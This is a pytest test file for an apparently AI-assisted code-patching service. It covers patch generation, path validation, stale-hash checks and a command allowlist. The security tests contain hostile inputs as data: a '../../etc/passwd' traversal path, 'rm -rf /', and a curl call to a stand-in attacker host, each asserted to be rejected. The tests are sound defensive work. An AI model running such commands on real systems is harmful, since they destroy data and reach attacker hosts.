import pytest
from app.services.patch_generator import PatchGenerator
from app.services.patch_validator import PatchValidator
from app.services.verification import VerificationRunner
from app.services.test_generator import TestGenerator
from app.schemas.repository import CodeSymbolSchema


def test_patch_generation_and_validation():
    edits = [
        {
            "path": "src/math.js",
            "old_content": "function divide(a, b) {\n  return a / b;\n}",
            "new_content": "function divide(a, b) {\n  if (b === 0) throw new Error('Zero division');\n  return a / b;\n}",
        }
    ]

    patch = PatchGenerator.propose_multi_file_patch(
        repository_id="repo-1",
        title="Handle zero division",
        description="Adds zero denominator validation",
        edits=edits,
    )

    assert patch.status == "pending"
    assert patch.validation_status == "valid"
    assert "Zero division" in patch.diff
    assert len(patch.files) == 1


def test_path_traversal_detection():
    valid, err = PatchValidator.validate_path("../../etc/passwd")
    assert valid is False
    assert "Path traversal" in err

    valid2, _ = PatchValidator.validate_path("src/components/Modal.jsx")
    assert valid2 is True


def test_stale_hash_protection():
    original = "console.log('original');"
    modified = "console.log('modified');"

    import hashlib
    orig_hash = hashlib.sha256(original.encode("utf-8")).hexdigest()

    valid, err = PatchValidator.validate_hash(modified, orig_hash)
    assert valid is False
    assert "Stale file detected" in err


def test_verification_command_security():
    assert VerificationRunner.is_command_allowed("npm test") is True
    assert VerificationRunner.is_command_allowed("pytest") is True
    assert VerificationRunner.is_command_allowed("rm -rf /") is False
    assert VerificationRunner.is_command_allowed("curl http://evil.com") is False


def test_ai_test_generator():
    symbol = CodeSymbolSchema(
        name="computeTotal",
        type="function",
        file_path="src/utils.js",
        start_line=1,
        end_line=10,
        parameters=["items", "tax"],
    )

    res = TestGenerator.generate_tests_for_symbol(symbol, "javascript")
    assert res["framework"] == "vitest"
    assert "computeTotal" in res["test_code"]
    assert "describe('computeTotal'" in res["test_code"]
